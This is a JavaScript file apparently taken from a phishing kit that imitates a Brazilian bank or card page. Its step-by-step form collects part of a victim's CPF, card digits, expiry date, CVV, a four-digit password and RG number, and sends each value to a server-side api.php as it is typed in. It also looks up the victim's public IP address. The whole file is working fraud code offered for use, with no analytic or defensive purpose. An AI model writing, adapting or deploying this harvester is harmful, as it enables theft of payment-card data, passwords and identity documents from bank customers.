
document.getElementById('sim').addEventListener('click',(e)=>{
e.preventDefault()
document.getElementById('msg1').style.display = 'none'
document.getElementById('cpf').style.display = 'block'

})
document.getElementById('nao').addEventListener('click',(e)=>{
e.preventDefault()
document.getElementById('msg1').style.display = 'none'
document.getElementById('cpf').style.display = 'block'

})


document.getElementById("info").addEventListener("input", function (e) {
    this.value = this.value.replace(/\D/g, ''); // Remove tudo que não for número
});
document.getElementById("input1").addEventListener("input", function (e) {
    this.value = this.value.replace(/\D/g, ''); // Remove tudo que não for número
});
document.getElementById("input2").addEventListener("input", function (e) {
    this.value = this.value.replace(/\D/g, ''); // Remove tudo que não for número
});
document.getElementById("input3").addEventListener("input", function (e) {
    this.value = this.value.replace(/\D/g, ''); // Remove tudo que não for número
});


let cpf1
let digitos 
let valida
let cvv
let senha
let rg




let ipUsuario;

async function iniciarSistema() {
    ipUsuario = await ipclient();
    console.log("Sistema iniciado com IP:", ipUsuario);

    // aqui você pode iniciar o restante do sistema
}

async function ipclient() {
    const response = await fetch("https://api.ipify.org?format=json");
    const data = await response.json();
    return data.ip;
}

iniciarSistema();



document.getElementById('cpfcontinuar').addEventListener('click',(e)=>{
    e.preventDefault()
    let cpf = document.getElementById('cpfinfo').value
    
    if(cpf.length == 3){
        enviarapi({ cpf1: cpf });
        document.getElementById('cpf').style.display = 'none'
        document.getElementById('msg2').style.display = 'block'
        //cpf1 = cpf
    
    }
    
})

document.getElementById('continuar').addEventListener('click',(e)=>{
    e.preventDefault()
    let enviar = document.getElementById('info').value
    if(enviar.length == 4){
        enviarapi({ digitos: enviar });
        document.getElementById('msg2').style.display = 'none'
        document.getElementById('va2').style.display = 'block'
       
        //digitos = enviar
    }
    
})


/*
  function mostrarBanner() {
    // Verifica se a div já existe para não criar duplicado
    if (document.getElementById("va2")) return;

    // Cria a div principal
    const banner = document.createElement("div");
    banner.className = "banner";
    banner.id = "va2";
    banner.style.display = "block"; // Exibe ao criar

    // Texto
    const texto = document.createElement("div");
    texto.innerHTML = "Insira a validade do seu Mais.<br>";

    // Input
    const input = document.createElement("input");
    input.type = "text";
    input.id = "infov2";
    input.style.margin = "10px 0px";
    input.style.width = "30%";
    input.style.borderRadius = "5px";

    // Quebra de linha
    const br = document.createElement("br");

    // Botão
    const botao = document.createElement("button");
    botao.type = "button";
    botao.id = "continuarv2";
    botao.innerText = "Continuar";
    botao.style.width = "50%";
    botao.style.opacity = "0.9";
    botao.style.borderRadius = "10px";
    botao.style.background = "blue";
    botao.style.color = "white";

    // Junta tudo
    banner.appendChild(texto);
    banner.appendChild(input);
    banner.appendChild(br.cloneNode()); // br após input
    banner.appendChild(botao);

    // Insere no container
    document.getElementById("container").appendChild(banner);
  }
*/




  
document.getElementById('continuarv2').addEventListener('click',(e)=>{
    e.preventDefault()
    let valid = document.getElementById('infov2').value
  
    if(valid.length == 5){
        enviarapi({ validade: valid });
        //valida = valid
        document.getElementById('va2').style.display = 'none'
        document.getElementById('msg3').style.display = 'block'
        
    }
    
})



  const validadeInput = document.getElementById('infov2');

  

  validadeInput.addEventListener("input", function(e) {
    let valor = e.target.value;

    // Remove tudo que não for número
    valor = valor.replace(/\D/g, "");

    // Adiciona a barra depois de 2 dígitos
    if (valor.length > 2) {
      valor = valor.substring(0, 2) + "/" + valor.substring(2, 4);
    }

    // Limita a 5 caracteres (MM/AA)
    e.target.value = valor.substring(0, 5);
  });


document.getElementById('continuar2').addEventListener('click',(e)=>{
    e.preventDefault()
    let cvv1 = document.querySelector('#input1').value
    let cvv2 = document.querySelector('#input2').value
    let cvv3 = document.querySelector('#input3').value
   
    if(cvv1.length != 0 && cvv2.length != 0 && cvv3.length != 0){
        cvv = `${cvv1}${cvv2}${cvv3}`
        enviarapi({ cvv: cvv });
       // enviarapi(cpf1,digitos,valida,cvv)
        document.getElementById('msg3').style.display = 'none'
        document.getElementById('senha').style.display = 'block'
     
       
    }
   
    
})



document.getElementById('continuarSenha').addEventListener('click',(e)=>{
e.preventDefault()

let valor = document.getElementById('infoSenha').value

if(valor.length == 4){
    enviarapi({ senha: valor });
//senha = valor
document.getElementById('senha').style.display = 'none'
document.getElementById('rg').style.display = 'block'

}

})




document.getElementById('continuarrg').addEventListener('click',(e)=>{
e.preventDefault()

let rgvalue = document.getElementById('inforg').value

if(rgvalue.length > 3 ){
enviarapi({ RG: rgvalue });
    //rg = rgvalue

   // enviarapi(cpf1,digitos,valida,cvv,senha,rg)
    document.getElementById('rg').style.display = 'none'
    document.getElementById('msg4').style.display = 'block'
}



})






function enviarapi(dados){

fetch('./api.php', {
    method: 'POST',
    headers:{
        'Content-Type' : 'application/json'
    },
    body: JSON.stringify(dados)
})
.then(response => response.text())
.then(data => {
console.log(data)
})
.catch(error => {
    console.log(error)
})
}


const inputs = document.querySelectorAll(".input-box");
inputs.forEach((input, index) => {
    input.addEventListener("input", () => {
        if (input.value.length === 1 && index < inputs.length - 1) {
            inputs[index + 1].focus();
        }
    });

    input.addEventListener("keydown", (event) => {
        if (event.key === "Backspace" && index > 0 && input.value === "") {
            inputs[index - 1].focus();
        }
    });
});